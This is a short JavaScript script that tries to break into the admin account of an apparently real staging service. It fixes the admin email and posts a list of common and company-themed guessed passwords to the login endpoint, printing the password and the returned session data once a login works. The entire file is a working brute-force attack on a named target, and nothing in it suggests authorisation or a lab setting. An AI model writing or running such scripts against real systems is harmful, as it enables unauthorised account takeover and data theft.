const url = 'https://rally-staging-9ae8.up.railway.app/api/admins/login';
const email = 'admin@hivago.com';

const passwords = [
    'admin123',
    'admin1234',
    'password',
    'admin',
    'admin@123',
    '123456',
    '12345678',
    'Hivago@123',
    'Hivago123',
    'hivago@123',
    'hivago123',
    'admin@hivago.com',
    'Aditya@123',
    'aditya123'
];

async function tryLogin() {
    for (const password of passwords) {
        console.log(`Trying password: ${password}`);
        try {
            const res = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password })
            });
            if (res.ok) {
                const data = await res.json();
                console.log(`SUCCESS! Password is: ${password}`);
                console.log(JSON.stringify(data, null, 2));
                return;
            } else {
                console.log(`Failed: ${res.status} ${res.statusText}`);
            }
        } catch (err) {
            console.error(err);
        }
    }
    console.log('None of the common passwords worked.');
}

tryLogin();
